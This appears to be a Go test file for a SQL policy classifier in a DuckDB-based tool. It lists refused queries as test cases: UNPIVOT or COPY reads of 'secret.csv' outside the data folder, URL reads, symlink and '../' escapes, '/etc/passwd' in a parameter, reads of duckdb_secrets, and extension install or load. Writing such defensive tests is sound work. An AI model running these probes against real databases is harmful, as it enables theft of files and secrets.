		{"net: data-file name value is refused in a write (blunt)", "UPDATE t SET name = 'report.csv'", sqlClassOther, "can't be checked"},
		{"net: URL in an unknown position of a CTAS", "CREATE TABLE zz AS SELECT * FROM t2 ORDER BY 'http://127.0.0.1:1/x.csv'", sqlClassOther, "can't be checked"},
		{"net: URL in a macro body", "CREATE MACRO mm() AS 'http://x/y.csv'", sqlClassOther, "can't be checked"},
		{"UNPIVOT a file outside (CTAS)", "CREATE TABLE stolen AS UNPIVOT '%OUT%/secret.csv' ON COLUMNS(*) INTO NAME k VALUE v", sqlClassOther, ""},
		{"UNPIVOT a URL (CREATE VIEW)", "CREATE VIEW vv AS UNPIVOT 'http://127.0.0.1:1/x.csv' ON a INTO NAME k VALUE v", sqlClassOther, ""},
		{"UNPIVOT a URL (CREATE MACRO)", "CREATE MACRO mm() AS TABLE UNPIVOT 'http://127.0.0.1:1/x.csv' ON a INTO NAME k VALUE v", sqlClassOther, ""},
		{"UNPIVOT in an EXISTS in a CTAS", "CREATE TABLE a AS SELECT 1 FROM t2 WHERE EXISTS (UNPIVOT 'http://127.0.0.1:1/x.csv' ON a INTO NAME k VALUE v)", sqlClassOther, ""},
		{"INSERT ... UNPIVOT url", "INSERT INTO t2 UNPIVOT 'http://127.0.0.1:1/x.csv' ON a INTO NAME k VALUE v", sqlClassOther, ""},
		{"COPY (UNPIVOT file)", "COPY (UNPIVOT '%OUT%/secret.csv' ON a INTO NAME k VALUE v) TO '%DATA%/o.csv'", sqlClassOther, ""},
		{"PIVOT a file outside (CTAS)", "CREATE TABLE a AS PIVOT '%OUT%/secret.csv' ON a USING sum(b)", sqlClassOther, ""},
		{"dependent script cannot be verified", "CREATE TABLE dep (a INTEGER); INSERT INTO dep VALUES (1)", sqlClassOther, "validate"},
	})
}

func TestPolicy_WritesAndDDLClassification(t *testing.T) {
	fx := newPolicyFixture(t, ModeFull)
	runPolicyCases(t, fx, []policyCase{
		{"insert", "INSERT INTO t VALUES (2, 'x')", sqlClassWrite, ""},
		{"insert with an inert value", "INSERT INTO t VALUES (2, 'N/A'), (3, 'a/b')", sqlClassWrite, ""},
		{"insert into another catalog", "INSERT INTO other.orders VALUES (3, 30)", sqlClassWrite, ""},
		{"insert or replace", "INSERT OR REPLACE INTO other.users VALUES (1, 'b@x.io')", sqlClassWrite, ""},
		{"insert select", "INSERT INTO t SELECT id, 'copy' FROM t2", sqlClassWrite, ""},
		{"insert from a data file", "INSERT INTO other.orders SELECT * FROM read_csv('%DATA%/x.csv')", sqlClassWrite, ""},
		{"update", "UPDATE t SET name = 'x' WHERE id = 1", sqlClassWrite, ""},
		{"update qualified", "UPDATE other.orders SET total = 0", sqlClassWrite, ""},
		{"delete", "DELETE FROM t WHERE id = 1", sqlClassWrite, ""},
		{"delete qualified", "DELETE FROM other.orders WHERE id = 1", sqlClassWrite, ""},
		{"merge", "MERGE INTO t USING t2 ON t.id = t2.id WHEN MATCHED THEN UPDATE SET name = 'x'", sqlClassWrite, ""},
		{"CTE with delete", "WITH x AS (SELECT id FROM t WHERE id > 100) DELETE FROM t WHERE id IN (SELECT id FROM x)", sqlClassWrite, ""},
		{"CTE with insert", "WITH x AS (SELECT 5 AS id, 'q' AS name) INSERT INTO t SELECT * FROM x", sqlClassWrite, ""},
		{"insert to a read-only catalog still classifies as a write (the gate refuses it)", "INSERT INTO ro.ledger VALUES (2, 1)", sqlClassWrite, ""},

		{"create table", "CREATE TABLE zz (id INTEGER)", sqlClassDDL, ""},
		{"create table in another catalog", "CREATE TABLE other.zz (id INTEGER)", sqlClassDDL, ""},
		{"create or replace", "CREATE OR REPLACE TABLE other.zz (id INTEGER)", sqlClassDDL, ""},
		{"create if not exists", "CREATE TABLE IF NOT EXISTS other.zz (id INTEGER)", sqlClassDDL, ""},
		{"create temp table", "CREATE TEMP TABLE zz (id INTEGER)", sqlClassDDL, ""},
		{"CTAS", "CREATE TABLE other.zz AS SELECT * FROM t", sqlClassDDL, ""},
		{"CTAS from a data file", "CREATE TABLE other.zz AS SELECT * FROM read_csv('%DATA%/x.csv')", sqlClassDDL, ""},
		{"UNPIVOT a file inside data/ (vetted source)", "CREATE TABLE okp AS UNPIVOT '%DATA%/x.csv' ON COLUMNS(*) INTO NAME k VALUE v", sqlClassDDL, ""},
		{"create view", "CREATE VIEW other.vv AS SELECT * FROM other.orders", sqlClassDDL, ""},
		{"create macro", "CREATE MACRO other.mm() AS 1", sqlClassDDL, ""},
		{"create sequence", "CREATE SEQUENCE other.sq", sqlClassDDL, ""},
		{"create schema", "CREATE SCHEMA other.s", sqlClassDDL, ""},
		{"create index", "CREATE INDEX ix ON other.orders (id)", sqlClassDDL, ""},
		{"create unique index", "CREATE UNIQUE INDEX ix ON other.orders (id)", sqlClassDDL, ""},
		{"drop table", "DROP TABLE other.orders", sqlClassDDL, ""},
		{"drop if exists", "DROP TABLE IF EXISTS other.nothing", sqlClassDDL, ""},
		{"drop view", "DROP VIEW IF EXISTS other.vv", sqlClassDDL, ""},
		{"alter table", "ALTER TABLE other.orders ADD COLUMN q INTEGER", sqlClassDDL, ""},
		{"alter table rename", "ALTER TABLE other.orders RENAME TO orders2", sqlClassDDL, ""},
		{"COPY query to a data file", "COPY (SELECT * FROM t) TO '%DATA%/out.csv' (HEADER, DELIMITER ',')", sqlClassDDL, ""},
		{"COPY a table to a data file", "COPY other.orders TO '%DATA%/orders.parquet' (FORMAT PARQUET)", sqlClassDDL, ""},
		{"insert plus ddl script", "INSERT INTO t VALUES (9, 'x'); DROP TABLE t2", sqlClassDDL, ""},
	})
}

func TestPolicy_Targets(t *testing.T) {
	fx := newPolicyFixture(t, ModeFull)
	targets := func(q string) []string {
		v := fx.classify(fx.expand(q))
		require.NotEqual(t, sqlClassOther, v.Class, "%q: %s", q, v.Reason)
		var out []string
		for _, tg := range v.Targets {
			out = append(out, tg.Catalog)
		}
		return out
	}
	assert.Equal(t, []string{"memory"}, targets("INSERT INTO t VALUES (2, 'x')"))
	assert.Equal(t, []string{"other"}, targets("INSERT INTO other.main.orders VALUES (3, 30)"))
	assert.ElementsMatch(t, []string{"memory", "other"}, targets("DELETE FROM other.orders"), "a two-part name is a schema of the default catalog or a catalog: both are targets")
	assert.Equal(t, []string{"other"}, targets("CREATE SCHEMA other.s"))
	assert.Equal(t, []string{"temp"}, targets("CREATE TEMP TABLE zz (id INTEGER)"))
	assert.Equal(t, []string{"other"}, targets("CREATE INDEX ix ON other.main.orders (id)"))
	assert.ElementsMatch(t, []string{"memory", "other"}, targets("DROP TABLE t; DROP TABLE other.main.orders"))
	assert.ElementsMatch(t, []string{"memory", "other"}, targets("INSERT INTO t VALUES (9, 'x'); DELETE FROM other.main.orders"))
	assert.Empty(t, targets("COPY (SELECT 1) TO '%DATA%/out.csv'"))
	assert.Empty(t, targets("SELECT * FROM t"))

	ro := fx.classify("INSERT INTO ro.ledger VALUES (2, 1)")
	require.Len(t, ro.Targets, 2) // ro.ledger could be schema "ro" of the default catalog
	var found bool
	for _, tg := range ro.Targets {
		if tg.Catalog == "ro" {
			found = true
			assert.True(t, tg.ReadOnly)
			assert.True(t, tg.Local)
		}
	}
	assert.True(t, found)

	v := fx.classify("INSERT INTO nope.main.x VALUES (1)")
	assert.Equal(t, sqlClassOther, v.Class)
	assert.Contains(t, v.Reason, "no connection named")
	v = fx.classify("INSERT INTO system.main.x VALUES (1)")
	assert.Equal(t, sqlClassOther, v.Class)
}

func TestPolicy_NoDataDirMeansNoFileReads(t *testing.T) {
	fx := newPolicyFixture(t, ModeFull, withoutDataDir())
	v := fx.classify(fx.expand("SELECT * FROM read_csv('%DATA%/x.csv')"))
	assert.Equal(t, sqlClassOther, v.Class)
	assert.Contains(t, v.Reason, "no workspace data/ folder")
	assert.Equal(t, sqlClassRead, fx.classify("SELECT * FROM t").Class)
}

func TestPolicy_Parameters(t *testing.T) {
	fx := newPolicyFixture(t, ModeFull)
	ctx := t.Context()
	v := fx.h.classify(ctx, fx.db, "SELECT * FROM t WHERE id = $id AND name = $name", map[string]any{"id": 1, "name": "Ada"})
	assert.Equal(t, sqlClassRead, v.Class, v.Reason)
	v = fx.h.classify(ctx, fx.db, "INSERT INTO t VALUES ($id, $name)", map[string]any{"id": 5, "name": "/etc/passwd"})
	assert.Equal(t, sqlClassWrite, v.Class, v.Reason)
	v = fx.h.classify(ctx, fx.db, "SELECT * FROM t WHERE id = $missing", map[string]any{})
	assert.Equal(t, sqlClassOther, v.Class)
	// A parameter cannot carry a path into a reader.
	v = fx.h.classify(ctx, fx.db, "SELECT * FROM read_csv($p)", map[string]any{"p": fx.p("x.csv")})
	assert.Equal(t, sqlClassOther, v.Class)
}

func TestPolicy_FileSymlinkAndGlobRules(t *testing.T) {
	fx := newPolicyFixture(t, ModeFull)
	// Remove the escaping symlink: the glob is then fine.
	require.NoError(t, os.Remove(filepath.Join(fx.dataDir, "link.csv")))
	v := fx.classify(fx.expand("SELECT count(*) FROM read_csv('%DATA%/*.csv')"))
	assert.Equal(t, sqlClassRead, v.Class, v.Reason)
	// A symlink to something else inside data/ is fine.
	require.NoError(t, os.Symlink(filepath.Join(fx.dataDir, "x.csv"), filepath.Join(fx.dataDir, "alias.csv")))
	v = fx.classify(fx.expand("SELECT * FROM read_csv('%DATA%/alias.csv')"))
	assert.Equal(t, sqlClassRead, v.Class, v.Reason)
	// A symlinked directory pointing out of data/.
	require.NoError(t, os.Symlink(fx.outside, filepath.Join(fx.dataDir, "outdir")))
	v = fx.classify(fx.expand("SELECT * FROM read_csv('%DATA%/outdir/secret.csv')"))
	assert.Equal(t, sqlClassOther, v.Class)
	v = fx.classify(fx.expand("SELECT * FROM glob('%DATA%/outdir/*')"))
	assert.Equal(t, sqlClassOther, v.Class)
}

func TestPolicy_ScopesForURLs(t *testing.T) {
	// URL reads are vetted by a literal prefix match against the scope of a
	// ready storage connection; the full read of a bucket needs MinIO (see the
	// integration tests), so this checks the decision itself.
	p := &pathPolicy{scopes: []string{"s3://lake/raw/", "gcs://bkt/", "r2://acct/"}}
	ok := func(u string) { assert.Empty(t, p.vetRead(u), u) }
	no := func(u string) { assert.NotEmpty(t, p.vetRead(u), u) }
	ok("s3://lake/raw/a.parquet")
	ok("s3://lake/raw/2024/*.parquet")
	ok("gcs://bkt/any/thing.csv")
	ok("r2://acct/x.json")
	no("s3://lake/other/a.parquet")
	no("s3://lake/raw") // the prefix itself, minus the slash
	no("s3://lake/rawx/a.parquet")
	no("s3://lake-evil/raw/a.parquet")
	no("s3://lake/raw/../other/a.parquet")
	no("s3://lake/raw/a.parquet?x=1")
	no("s3://lake/raw/a.parquet#frag")
	no("S3://lake/raw/a.parquet")
	no("s3a://lake/raw/a.parquet")
	no("gs://bkt/x.csv") // alias of gcs: refused rather than guessed
	no("https://lake.s3.amazonaws.com/raw/a.parquet")
	no("http://127.0.0.1:9000/lake/raw/a.parquet")
	no("hf://datasets/x/y")
	no("az://c/x")
	no("s3://lake/raw/a b.parquet")
	no("s3://lake/raw/a\\b.parquet")
	no("s3://lake/raw/a\x00.parquet")

	assert.Equal(t, "s3://bucket/", normalizeScope("s3://bucket"))
	assert.Equal(t, "s3://bucket/p/", normalizeScope("s3://bucket/p/"))
	assert.Equal(t, "", normalizeScope("bucket"))
	assert.Equal(t, "", normalizeScope(""))

	none := &pathPolicy{}
	assert.Contains(t, none.vetRead("s3://lake/raw/a.parquet"), "no ready storage connection")
}

func TestPolicy_StorageConnectionsMustBeReady(t *testing.T) {
	// Only a storage connection that is ok or not yet connected widens what is
	// readable; one that needs credentials or failed does not.
	env := newSQLEnv("", []session.ConnectionInfo{
		{Name: "lake", Type: "s3", Kind: session.StatusOK, Catalogless: true, Scope: "s3://lake/raw/"},
		{Name: "idle", Type: "s3", Kind: session.StatusNotConnected, Catalogless: true, Scope: "s3://idle/"},
		{Name: "bad", Type: "s3", Kind: session.StatusNeedsCredentials, Catalogless: true, Scope: "s3://bad/"},
		{Name: "err", Type: "gcs", Kind: session.StatusError, Catalogless: true, Scope: "gcs://err/"},
		{Name: "noscope", Type: "s3", Kind: session.StatusOK, Catalogless: true},
	})
	p := env.pathPolicy()
	assert.Equal(t, []string{"s3://lake/raw/", "s3://idle/"}, p.scopes)
}

// TestPolicy_OrdinaryAnalyticsStaysAllowed guards against the allow-list
// refusing everyday SQL: the plan-operator layer must know the operators
// DuckDB's optimizer produces for ordinary queries.
func TestPolicy_OrdinaryAnalyticsStaysAllowed(t *testing.T) {
	fx := newPolicyFixture(t, ModeFull)
	fx.exec(`CREATE TABLE sales (id INT PRIMARY KEY, region VARCHAR, amount DOUBLE, ts TIMESTAMP, tags VARCHAR[], meta JSON, s STRUCT(a INT, b VARCHAR))`)
	reads := []string{
		"SELECT region, sum(amount) FROM sales GROUP BY ALL ORDER BY 2 DESC LIMIT 5",
		"SELECT *, row_number() OVER (PARTITION BY region ORDER BY amount) rn FROM sales QUALIFY rn <= 3",
		"SELECT * EXCLUDE (meta) FROM sales",
		"SELECT COLUMNS('a.*') FROM sales",
		"SELECT unnest(tags) FROM sales",
		"SELECT s.a, s['b'], json_extract(meta, '$.x'), meta->>'y' FROM sales",
		"SELECT date_trunc('month', ts) m, count(*) FROM sales GROUP BY m",
		"SELECT * FROM sales USING SAMPLE 10 PERCENT",
		"SELECT * FROM sales TABLESAMPLE reservoir(5 ROWS)",
		"SELECT * FROM sales PIVOT (sum(amount) FOR region IN ('a','b'))",
		"SELECT * FROM sales UNPIVOT (v FOR k IN (id, amount))",
		"SELECT * FROM sales a JOIN sales b USING (id)",
		"SELECT * FROM sales a ASOF JOIN sales b ON a.ts >= b.ts",
		"SELECT * FROM sales a LEFT JOIN LATERAL (SELECT * FROM sales b WHERE b.id = a.id LIMIT 1) c ON true",
		"SELECT * FROM sales WHERE amount > (SELECT avg(amount) FROM sales)",
		"SELECT * FROM sales WHERE EXISTS (SELECT 1 FROM t WHERE t.id = sales.id)",
		"SELECT * FROM sales UNION ALL SELECT * FROM sales",
		"SELECT * FROM sales EXCEPT SELECT * FROM sales",
		"WITH RECURSIVE c(n) AS (SELECT 1 UNION ALL SELECT n+1 FROM c WHERE n < 5) SELECT * FROM c",
		"SELECT * FROM sales ORDER BY ALL",
		"SELECT * FROM sales LIMIT 10 OFFSET 5",
		"SELECT DISTINCT ON (region) * FROM sales",
		"SELECT percentile_cont(0.5) WITHIN GROUP (ORDER BY amount) FROM sales",
		"SELECT * FROM sales a SEMI JOIN t ON a.id = t.id",
		"SELECT * FROM sales a ANTI JOIN t ON a.id = t.id",
		"SELECT * FROM sales a POSITIONAL JOIN t",
		"SELECT * FROM (VALUES (1,'a'),(2,'b')) v(id, n) JOIN sales USING (id)",
		"SELECT * FROM generate_series(DATE '2024-01-01', DATE '2024-01-10', INTERVAL 1 DAY)",
		"SELECT * FROM sales t1 WHERE amount = (SELECT max(amount) FROM sales t2 WHERE t2.region = t1.region)",
		"DESCRIBE sales",
		"SUMMARIZE sales",
		"EXPLAIN SELECT * FROM sales a JOIN sales b USING (id)",
	}
	for _, q := range reads {
		v := fx.classify(q)
		assert.Equal(t, sqlClassRead, v.Class, "%s: %s", q, v.Reason)
	}
	writes := []string{
		"INSERT INTO sales (id, region) VALUES (1, 'a') ON CONFLICT (id) DO UPDATE SET region = EXCLUDED.region",
		"INSERT INTO sales BY NAME SELECT 1 AS id, 'x' AS region",
		"UPDATE sales SET amount = amount * 2 WHERE region = 'a' RETURNING *",
		"UPDATE sales SET amount = s2.amount FROM sales s2 WHERE s2.id = sales.id",
		"DELETE FROM sales WHERE id IN (SELECT id FROM t)",
		"DELETE FROM sales USING t WHERE t.id = sales.id",
	}
	for _, q := range writes {
		v := fx.classify(q)
		assert.Equal(t, sqlClassWrite, v.Class, "%s: %s", q, v.Reason)
	}
	ddl := []string{
		"CREATE TABLE sales2 AS SELECT * FROM sales",
		"CREATE OR REPLACE TABLE sales3 AS SELECT region, count(*) c FROM sales GROUP BY region",
		"CREATE VIEW sv AS SELECT * FROM sales",
		"CREATE TABLE t9 (id INTEGER PRIMARY KEY, name VARCHAR NOT NULL, ts TIMESTAMP DEFAULT now(), FOREIGN KEY (id) REFERENCES t(id))",
		"CREATE INDEX ix_s ON sales (id)",
		"CREATE MACRO addone(x) AS x + 1",
		"CREATE SEQUENCE seq1",
		"CREATE TYPE mood AS ENUM ('a','b')",
		"ALTER TABLE sales ADD COLUMN note VARCHAR DEFAULT 'n'",
		"ALTER TABLE sales RENAME COLUMN id TO id2",
		"DROP VIEW IF EXISTS nothing",
	}
	for _, q := range ddl {
		v := fx.classify(q)
		assert.Equal(t, sqlClassDDL, v.Class, "%s: %s", q, v.Reason)
	}
	// A statement the parser cannot split reliably is denied rather than guessed:
	// the PIVOT statement expands into several statements inside DuckDB.
	v := fx.classify("PIVOT sales ON region USING sum(amount)")
	assert.Equal(t, sqlClassOther, v.Class)
}

func TestPolicy_MoreNeverListCases(t *testing.T) {
	fx := newPolicyFixture(t, ModeFull)
	fx.exec(`CREATE MACRO owner_reader(p) AS TABLE SELECT * FROM read_csv(p)`)
	runPolicyCases(t, fx, []policyCase{
		{"UPDATE EXTENSIONS", "UPDATE EXTENSIONS", sqlClassOther, "update"},
		{"UPDATE EXTENSIONS with a list", "UPDATE EXTENSIONS (httpfs)", sqlClassOther, "update"},
		{"bare duckdb_secrets", "SELECT * FROM duckdb_secrets", sqlClassOther, "secrets are managed"},
		{"bare system relation not on the list", "SELECT * FROM duckdb_extensions", sqlClassOther, "not found"},
		{"pragma_storage_info", "SELECT * FROM pragma_storage_info('t')", sqlClassOther, "allow-list"},
		{"system catalog qualified", "SELECT * FROM system.main.duckdb_settings", sqlClassOther, ""},
		{"COPY to a database file", "COPY t TO '%DATA%/out.duckdb'", sqlClassOther, "database or extension"},
		{"COPY to an extension file", "COPY t TO '%DATA%/evil.duckdb_extension'", sqlClassOther, "database or extension"},
		{"COPY to a wal file", "COPY t TO '%DATA%/x.wal'", sqlClassOther, "database or extension"},
		{"INSERT into the system catalog", "INSERT INTO system.main.x VALUES (1)", sqlClassOther, ""},
		{"LOAD after a read", "SELECT 1; LOAD httpfs", sqlClassOther, "load"},
		{"installing from a community repository", "INSTALL h3 FROM community", sqlClassOther, "install"},
		{"CALL pragma_version", "CALL pragma_version()", sqlClassOther, "allow-list"},
		{"table macro defined by the owner that passes a parameter to a reader", "SELECT * FROM owner_reader('%DATA%/x.csv')", sqlClassOther, "plain string literal"},
	})
}
